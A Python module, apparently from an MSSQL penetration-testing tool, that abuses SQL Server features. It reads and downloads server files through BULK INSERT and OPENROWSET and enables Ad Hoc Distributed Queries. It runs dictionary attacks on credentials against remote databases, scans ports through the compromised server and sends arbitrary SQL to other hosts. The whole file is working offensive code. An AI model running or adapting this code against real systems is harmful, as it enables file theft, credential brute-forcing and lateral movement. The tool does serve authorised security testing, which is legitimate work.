#!/usr/bin/python
# -*- coding: utf-8 -*-

import logging, ntpath
from Mssql import Mssql
from Utils import cleanString, ErrorClass, generateUniqueName, checkOptionsGivenByTheUser, putDataToFile ,getStandardBarStarted
from time import sleep
from Constants import *
from ScanPorts import ScanPorts

class BulkOpen (Mssql):#Mssql
	'''
	To to read a file stored in the database server
	thans to BULK INSERT
	'''
	#CONSTANTES
	REQ_CREATE_TABLE  = "CREATE TABLE {0} (line varchar(255));"
	REQ_DROP_TABLE = "DROP TABLE {0};"
	ROW_TERMINATOR = "\n"
	REQ_BULK_INSERT = "BULK INSERT {0} FROM '{1}' WITH (ROWTERMINATOR ='"+ROW_TERMINATOR+"');" #{0} Table, {1} nom du fichier
	REQ_READ_LINES = "SELECT line FROM {0};"
	REQ_OPENROWSET = "SELECT BulkColumn FROM OPENROWSET (BULK '{0}', SINGLE_CLOB) MyFile;" #{0} File
	REQ_ENABLE_ADHOC_DISTRIBUTED_QUERIES_1 ="EXEC sp_configure 'show advanced options', 1"
	REQ_ENABLE_ADHOC_DISTRIBUTED_QUERIES_2 ="EXEC sp_configure 'Ad Hoc Distributed Queries', 1"
	REQ_ENABLE_ADHOC_DISTRIBUTED_QUERIES_3 ="EXEC sp_configure 'show advanced options', 0"
	REQ_DISABLE_ADHOC_DISTRIBUTED_QUERIES_1 ="EXEC sp_configure 'show advanced options', 1"
	REQ_DISABLE_ADHOC_DISTRIBUTED_QUERIES_2 ="EXEC sp_configure 'Ad Hoc Distributed Queries', 0"
	REQ_DISABLE_ADHOC_DISTRIBUTED_QUERIES_3 ="EXEC sp_configure 'show advanced options', 0"
	REQ_RECONFIURE = "RECONFIGURE"
	REQ_OPENROWSET_REMOTE_CONNECTION = "SELECT * FROM OPENROWSET('SQLNCLI','DRIVER={{SQL Server}};SERVER={0},{4};UID={1};PWD={2};DATABASE={3}','{5}')"#{0} IP, {1} login, {2} password, {3} databse, {4} port , {5} sql request (ex: select @@ServerName)
	#ERRORS
	ERROR_CANNOT_BULK_OPEN_NOT_EXIST_1 = "Cannot bulk load. The file"
	ERROR_CANNOT_BULK_OPEN_NOT_EXIST_2 = "does not exist."

	def __init__(self, args):
		'''
		Constructor
		'''
		Mssql.__init__(self, args=args)
		self.tableName = self.POST_TABLE_NAME + generateUniqueName()
		
	def enableAdHocDistributedQueries (self):
		'''
		Enable Ad Hoc Distributed Queries
		Return True if OK
		'''
		logging.info("Re-enabling Ad Hoc Distributed Queries...")
		data = self.executeRequest(self.REQ_ENABLE_ADHOC_DISTRIBUTED_QUERIES_1,noResult=True)
		if isinstance(data,Exception): return data
		data = self.executeRequest(self.REQ_RECONFIURE,noResult=True)
		if isinstance(data,Exception): return data
		data = self.executeRequest(self.REQ_ENABLE_ADHOC_DISTRIBUTED_QUERIES_2,noResult=True)
		if isinstance(data,Exception): return data
		data = self.executeRequest(self.REQ_ENABLE_ADHOC_DISTRIBUTED_QUERIES_3,noResult=True)
		if isinstance(data,Exception): return data
		data = self.executeRequest(self.REQ_RECONFIURE,noResult=True)
		if isinstance(data,Exception): return data
		logging.info("Ad Hoc Distributed Queries is re-enabled")
		return True
		
	def disableAdHocDistributedQueries (self):
		'''
		Disable Ad Hoc Distributed Queries
		Return True if OK
		'''
		logging.info("Disabling Ad Hoc Distributed Queries...")
		data = self.executeRequest(self.REQ_DISABLE_ADHOC_DISTRIBUTED_QUERIES_1,noResult=True)
		if isinstance(data,Exception): return data
		data = self.executeRequest(self.REQ_RECONFIURE,noResult=True)
		if isinstance(data,Exception): return data
		data = self.executeRequest(self.REQ_DISABLE_ADHOC_DISTRIBUTED_QUERIES_2,noResult=True)
		if isinstance(data,Exception): return data
		data = self.executeRequest(self.REQ_DISABLE_ADHOC_DISTRIBUTED_QUERIES_3,noResult=True)
		if isinstance(data,Exception): return data
		data = self.executeRequest(self.REQ_RECONFIURE,noResult=True)
		if isinstance(data,Exception): return data
		logging.info("Ad Hoc Distributed Queries is disabled")
		return True
		
	def __createTable__ (self):
		'''
		CreateTheTable
		return True or an Error object
		'''
		logging.info("Creating the table '{0}'...".format(self.tableName))
		data = self.executeRequest(self.REQ_CREATE_TABLE.format(self.tableName),noResult=True)
		if isinstance(data,Exception):
			logging.debug("Impossible to create the table '{1}': {0}".format(data, self.tableName))
			return data
		else: 
			logging.debug("The table {0} has been created".format(self.tableName))
			return True
	
	def __dropTable__ (self):
		'''
		Drop the table
		return True or an Error object
		'''
		logging.info("Dropping the table '{0}'...".format(self.tableName))
		data = self.executeRequest(self.REQ_DROP_TABLE.format(self.tableName),noResult=True)
		if isinstance(data,Exception):
			logging.debug("Impossible to drop the table '{1}': {0}".format(data, self.tableName))
			return data
		else: 
			logging.debug("The table {0} has been dropped".format(self.tableName))
			return True
			
	def readFileViaBulkinsert (self,fileName):
		'''
		To read a file stored in the database server
		Return string if ok.
		otherwise, return error
		'''
		logging.info("Reading the file '{0}' via BULK INSERT...".format(fileName))
		data = self.__createTable__()
		if data == True:
			logging.info("Inserting data stored in the file '{0}' in the table...".format(fileName))
			data = self.executeRequest(self.REQ_BULK_INSERT.format(self.tableName, fileName),noResult=True)
			if isinstance(data,Exception):
				logging.debug("Impossible to load the file '{0}': {1}".format(fileName,data))
			else: 
				logging.debug("The file {0} is loaded in the table {1}".format(fileName, self.tableName))
				data = self.executeRequest(self.REQ_READ_LINES.format(self.tableName), ld=['line'])
				if isinstance(data,Exception):
					logging.debug("Impossible to read lines stored '{0}': {1}".format(fileName,data))
				else:
					output = ""
					for l in data: output += l['line']+self.ROW_TERMINATOR
					data = output
			self.__dropTable__()
		else:
			logging.debug("Impossible to create the table {0} to load data stored in the file {0}".format(self.tableName, fileName))
		return data
		
	def readFileViaOpenRowSet (self,fileName):
		'''
		To read a file stored in the database server
		Return string if ok.
		otherwise, return error
		'''
		logging.info("Reading the file '{0}' via OPENROWSET...".format(fileName))
		data = self.executeRequest(self.REQ_OPENROWSET.format(fileName),ld=['BulkColumn'])
		if isinstance(data,Exception):
			logging.debug("Impossible to read the file '{0}': {1}".format(fileName, data))
			return data
		else: 
			output = ""
			for l in data: output += l['BulkColumn']+self.ROW_TERMINATOR
			data = output
		return data
		
	def getFileViaBulkinsert(self, remoteFile, localFile):
		'''
		Copy the remote file remofile to localFile via Bulk insert
		return True or an Exception
		'''
		logging.info ('Copy the remote file {0} to {1} via Bulk insert'.format(remoteFile, localFile))
		data = self.readFileViaBulkinsert(remoteFile)
		if isinstance(data,Exception):
			logging.info("Impossible to read the file {0} with Bulk insert: {1}".format(remoteFile, data))
			return data
		else :
			putDataToFile(data, localFile)
			logging.info ('The local file {0} has been created'.format(localFile))
			return True
		
	def getFileViaOpenRowSet(self, remoteFile, localFile):
		'''
		Copy the remote file remofile to localFile via OpenRowSet
		'''
		logging.info ('Copy the remote file {0} to {1} via Openrowset'.format(remoteFile, localFile))
		data = self.readFileViaOpenRowSet(remoteFile)
		if isinstance(data,Exception):
			logging.info("Impossible to read the file {0} with OpenRowSet: {1}".format(remoteFile, data))
			return data
		else :
			putDataToFile(data, localFile)
			logging.info ('The local file {0} has been created'.format(localFile))
			return True
		
	def remoteConnectionWithOpenrowset (self, ip, port, login, password, database, sqlRequest):
		'''
		Remote connection to a Mssql database with Openrowset
		'''
		logging.info ("Try to execute the sql request '{0}' on the remote database {1}:{5} with the account '{3}'/'{4}' on the database {2}".format(sqlRequest, ip, database, login, password,port))
		data = self.executeRequest(self.REQ_OPENROWSET_REMOTE_CONNECTION.format(ip, login, password, database, port, sqlRequest), noResult=False)
		if isinstance(data,Exception):
			if ERROR_PROCEDURE_BLOCKED in str(data):
				self.enableAdHocDistributedQueries()
				data = self.executeRequest(self.REQ_OPENROWSET_REMOTE_CONNECTION.format(ip, login, password, database, port, sqlRequest), noResult=False)
				if isinstance(data,Exception):
					logging.info ("Impossible to connect to the remote database {0}:{1} while it tries to re-enable Ad Hoc Distributed Queries: {2}".format(ip, port, data))
				else:
					logging.info ("Account {0}/{1} is valid on the database {2}:{3}. Results of '{4}': {5}".format(login, password, ip, port, sqlRequest, repr(data[0])))
			else:
				logging.info ("Impossible to connect to the remote database {0}:{1}: {2}".format(ip, port, data))
		else:
			logging.info ("Account {0}/{1} is valid on the database {2}:{3}. Results of '{4}': {5}".format(login, password, ip, port, sqlRequest, repr(data[0])))
		return data
		
	def __getAccounts__(self, accountsFile, credSeparator='/'):
		'''
		return list containing accounts
		'''
		accounts = []
		logging.info('Loading accounts stored in the {0} file...'.format(accountsFile))
		f = open(accountsFile)
		for l in f:
			lsplit = cleanString(l).split(credSeparator)
			if isinstance(lsplit,list):
				if len(lsplit) == 2 : accounts.append([lsplit[0],lsplit[1]])
				elif len(lsplit) > 2 :
					tempPasswd = ""
					for i in range(len(lsplit)): 
						if i != 0 : tempPasswd += lsplit[i]
					accounts.append([lsplit[0],tempPasswd])
				else : logging.warning("The account '{0}' not contains '{1}' or it contains more than one '{1}'. This account will not be tested".format(lsplit[0],self.credSeparator))
		f.close()
		logging.debug("Accounts loaded")
		return sorted(accounts, key=lambda x: x[0])
		
	def searchValideAccounts(self, ip, port, database=DEFAULT_DATABASE_NAME, sqlRequest=DEFAULT_SQL_REQUEST, accountsFile=DEFAULT_ACCOUNT_FILE):
		'''
		search valid accounts on a targeted database through Openrowset
		Return validAccounts = [[]]
		'''
		#logging.info ("Search valid accounts (stored in {3}) on the remote database {O}:{1}/{2}".format(ip, port, database, accountsFile))
		accounts = self.__getAccounts__(accountsFile=accountsFile)
		pbar, nb, validAccounts = getStandardBarStarted(len(accounts)), 0, []
		for anAccount in accounts :
			nb += 1
			pbar.update(nb)
			logging.debug("Try to connect with {0}".format('/'.join(anAccount)))
			status = self.remoteConnectionWithOpenrowset (ip=ip, port=port, login=anAccount[0], password=anAccount[1], database=database, sqlRequest=sqlRequest)
			if isinstance(status,Exception):
				if ERROR_PROCEDURE_BLOCKED in str(status):
					logging.info("openrowset can't be used to connect to a remote database")
					return status
				else:
					logging.info("Unvalid credential: '{0}'/'{1}' on ('{2}':'{3}'/'{4}')  ".format(anAccount[0], anAccount[1], ip, port, database))
			else:
				logging.info("Valid credential: '{0}'/'{1}' on ('{2}':'{3}'/'{4}')  ".format(anAccount[0], anAccount[1], ip, port, database))
				validAccounts.append([anAccount[0], anAccount[1]])
			sleep(self.args['timeSleep'])
		pbar.finish()
		return validAccounts
		
	def scanPortsWithOpenrowset(self, ip, ports,nbThread=SCAN_PORT_NUMBER_THREAD):
		'''
		To scan ports with openrowset
		'''
		portsList = []
		logging.info('Scanning ports of the server {0}'.format(ip))
		if "," in ports: portsList=ports.split(',')
		elif '-' in ports:
			startEnd = ports.split('-')
			for aPort in range(int(startEnd[0]),int(startEnd[1])): 
				portsList.append(str(aPort))
		elif ports.isdigit() == True: 
			portsList = [ports]
		else : 
			return ErrorClass("Syntax for ports given not recognized")
		scanPorts = ScanPorts(self.args)
		results = scanPorts.scanTcpPorts(scannerObject=self,ip=ip,ports=portsList,nbThread=nbThread)
		scanPorts.printScanPortResults(results)
		
	def testAll (self):
		'''
		Test all functions
		'''
		self.args['print'].subtitle("Can you use Bulk Insert to read files ?")
		status = self.readFileViaBulkinsert(DEFAULT_FILENAME)
		if isinstance(status,Exception):
			if self.__isFileNotExist__(status) == True:
				logging.debug("The file doesn't exist. Consequently, we can use this feature to read files.")
				self.args['print'].goodNews("OK")
			else :
				self.args['print'].badNews("KO")
		else :
			self.args['print'].goodNews("OK")
		self.args['print'].subtitle("Can you use Openrowset to read files ?")
		status = self.readFileViaOpenRowSet(DEFAULT_FILENAME)
		if isinstance(status,Exception): 
			if self.__isFileNotExist__(status) == True:
				logging.debug("The file doesn't exist. Consequently, we can use this feature to read files.")
				self.args['print'].goodNews("OK")
			else :
				self.args['print'].badNews("KO")
		else :
			self.args['print'].goodNews("OK")
		self.args['print'].subtitle("Can you connect to remote databases with openrowset ? (useful for dictionary attacks)")
		status = self.remoteConnectionWithOpenrowset(ip='127.0.0.1', port=self.args['port'], login=self.args['user'], password=self.args['password'], database=DEFAULT_DATABASE_NAME, sqlRequest=DEFAULT_SQL_REQUEST)
		if isinstance(status,Exception):
			status = self.enableAdHocDistributedQueries()
			if status == True:
				self.args['print'].goodNews("OK")
				self.disableAdHocDistributedQueries()
			else:
				self.args['print'].badNews("KO")
		else :
			self.args['print'].goodNews("OK")
			
	def __isFileNotExist__(self, exception):
		excp = str(exception)
		if self.ERROR_CANNOT_BULK_OPEN_NOT_EXIST_1 in excp and self.ERROR_CANNOT_BULK_OPEN_NOT_EXIST_2 in excp:
			return True
		else: 
			return False
		
def runBulkOpenModule(args):
	'''
	Run the BulkOpen module
	'''
	
	def runBulkInsertForRead(args,bulkOpen):
		'''
		Run the Bulk Insert method to read a file
		'''
		args['print'].title("Try to read the remote file {0} thanks to the Bulk Insert method".format(args["read-file"][0]))
		data = bulkOpen.readFileViaBulkinsert(args["read-file"][0])
		if isinstance(data,Exception):
			args['print'].badNews("Impossible to read the remote file {0} with Bulk Insert: {1}".format(args["read-file"][0],data))
			return data
		else:
			args['print'].goodNews("Data stored in the remote file {0}:\n{1}".format(args["read-file"][0], data.encode('utf-8')))
			return True
			
	def runOpenRowSetForRead(args,bulkOpen):
		'''
		Run the Openrowset method to read a file
		'''
		args['print'].title("Try to read the remote file {0} thanks to the Openrowset method".format(args["read-file"][0]))
		data = bulkOpen.readFileViaOpenRowSet(args["read-file"][0])
		if isinstance(data,Exception):
			args['print'].badNews("Impossible to read the remote file {0} with Openrowset: {1}".format(args["read-file"][0],data))
			return data
		else:
			args['print'].goodNews("Data stored in the remote file {0}:\n{1}".format(args["read-file"][0], data.encode('utf-8')))
			return True
			
	def runBulkInsertForGet(args, bulkOpen):
		'''
		Run the Bulk Insert method to get a remote file
		'''
		args['print'].title("Try to get the remote file {0} thanks to the Bulk Insert method".format(args["get-file"][0]))
		status = bulkOpen.getFileViaBulkinsert(args["get-file"][0],args["get-file"][1])
		if isinstance(status,Exception):
			args['print'].badNews("Impossible to get the remote file {0} with Bulk Insert: {1}".format(args["get-file"][0],status))
			return status
		else:
			args['print'].goodNews("Data stored in the remote file {0} is saved in the file {1}".format(args["get-file"][0], args["get-file"][1]))
			return True
		
	def runOpenRowSetForGet(args, bulkOpen):
		'''
		Run the Openrowset method to get a file
		'''
		args['print'].title("Try to get the remote file {0} thanks to the Openrowset method".format(args["get-file"][0]))
		status = bulkOpen.getFileViaOpenRowSet(args["get-file"][0],args["get-file"][1])
		if isinstance(status,Exception):
			args['print'].badNews("Impossible to get the remote file {0} with Openrowset: {1}".format(args["get-file"][0],status))
			return status
		else:
			args['print'].goodNews("Data stored in the remote file {0} is saved in the file {1}".format(args["get-file"][0], args["get-file"][1]))
			return True
			
	if checkOptionsGivenByTheUser(args,["read-file","get-file","enable-ad-hoc-distributed-queries","disable-ad-hoc-distributed-queries","search-credentials","scan-ports","request-rdb"],checkAccount=True) == False : return EXIT_MISS_ARGUMENT
	bulkOpen = BulkOpen(args)
	bulkOpen.connect()
	if args["test-module"] ==True: 
		bulkOpen.testAll()
	#enable-ad-hoc-distributed-queries
	if args["enable-ad-hoc-distributed-queries"] ==True:
		args['print'].title("Try to enable ad hoc distributed queries")
		status = bulkOpen.enableAdHocDistributedQueries()
		if status == True:
			args['print'].goodNews("Ad hoc distributed queries has been enabled")
		else:
			args['print'].badNews("Impossible to enable ad hoc distributed queries: {1}".format(status))
	#read-file option
	if args["read-file"] != None:
		if args["method"] != None:
			if args["method"]==BULKOPEN_METHOD_IN_BULKOPEN:
				runBulkInsertForRead(args,bulkOpen)
			elif args["method"]==OPENROWSET_METHOD_IN_BULKOPEN:
				runOpenRowSetForRead(args,bulkOpen)
		else:
			data = runBulkInsertForRead(args,bulkOpen)
			if isinstance(data,Exception):
				runOpenRowSetForRead(args,bulkOpen)
	#get-file option
	if args["get-file"] != None:
		if args["method"] != None:
			if args["method"]==BULKOPEN_METHOD_IN_BULKOPEN:
				runBulkInsertForGet(args,bulkOpen)
			elif args["method"]==OPENROWSET_METHOD_IN_BULKOPEN:
				runOpenRowSetForGet(args,bulkOpen)
		else:
			data = runBulkInsertForGet(args,bulkOpen)
			if isinstance(data,Exception):
				runOpenRowSetForGet(args,bulkOpen)
	#dictionary attack on a remote database
	if args["search-credentials"] != None :
		args['print'].title("Dictionnary attack on the database {0}:{1}/{2} with the credentials file {3}".format(args["search-credentials"][0],args["search-credentials"][1],args["search-credentials"][2],args['accounts-file']))
		accounts = bulkOpen.searchValideAccounts(args["search-credentials"][0],args["search-credentials"][1],args["search-credentials"][2], sqlRequest=DEFAULT_SQL_REQUEST, accountsFile=args['accounts-file'])
		if isinstance(accounts,Exception):
			status = bulkOpen.enableAdHocDistributedQueries()
			if status == True:
				accounts = bulkOpen.searchValideAccounts(args["search-credentials"][0],args["search-credentials"][1],args["search-credentials"][2], sqlRequest=DEFAULT_SQL_REQUEST, accountsFile=args['accounts-file'])
				if isinstance(accounts,Exception):
					args['print'].badNews("Impossible to use openrowset to connect to a remote database: {0}. Impossible to enable OpenRowset: {1}".format(accounts,status))
				else :
					args['print'].goodNews("valid accounts found on {0}:{1}/{2}: {3}".format(args["search-credentials"][0],args["search-credentials"][1],args["search-credentials"][2],accounts))
					bulkOpen.disableAdHocDistributedQueries()
			else :
				args['print'].badNews("Impossible to use openrowset to connect to a remote database: {0}. Impossible to enable OpenRowset: {1}".format(accounts,status))
		else: 
			args['print'].goodNews("valid accounts found on {0}:{1}/{2}: {3}".format(args["search-credentials"][0],args["search-credentials"][1],args["search-credentials"][2],accounts))
	#request a remote database from the target
	if args["request-rdb"] != None :
		args['print'].title("Try to send the request '{0}' to {1}:{2}@{3}:{4}/{5}".format(args["request-rdb"][5], args["request-rdb"][3], args["request-rdb"][4], args["request-rdb"][0], args["request-rdb"][1],args["request-rdb"][2]))
		results = bulkOpen.remoteConnectionWithOpenrowset (ip=args["request-rdb"][0], port=args["request-rdb"][1], login=args["request-rdb"][3], password=args["request-rdb"][4], database=args["request-rdb"][2], sqlRequest=args["request-rdb"][5])
		if isinstance(results ,Exception):
			args['print'].badNews("Impossible to request the remote database: {0}".format(results))
		else: 
			table = ""
			for l in results:
				table += ' | '.join(map(str,l))+'\n'
			args['print'].goodNews("Results:\n{0}".format(table))
	#Scan ports with openrowset
	if args['scan-ports'] != None:
		args['print'].title("Scanning ports of {0} through {1}".format(args['scan-ports'][0],args['host']))
		results = bulkOpen.scanPortsWithOpenrowset(ip=args['scan-ports'][0], ports=args['scan-ports'][1], nbThread=SCAN_PORT_NUMBER_THREAD)
		if isinstance(results ,Exception):
			args['print'].badNews("Impossible to scan ports: {0}".format(results))
	#disable-ad-hoc-distributed-queries
	if args["disable-ad-hoc-distributed-queries"] == True:
		args['print'].title("Try to disable ad hoc distributed queries")
		status = bulkOpen.disableAdHocDistributedQueries()
		if status == True:
			args['print'].goodNews("Ad hoc distributed queries has been disabled")
		else:
			args['print'].badNews("Impossible to disable ad hoc distributed queries: {0}".format(status))
	bulkOpen.closeConnection()

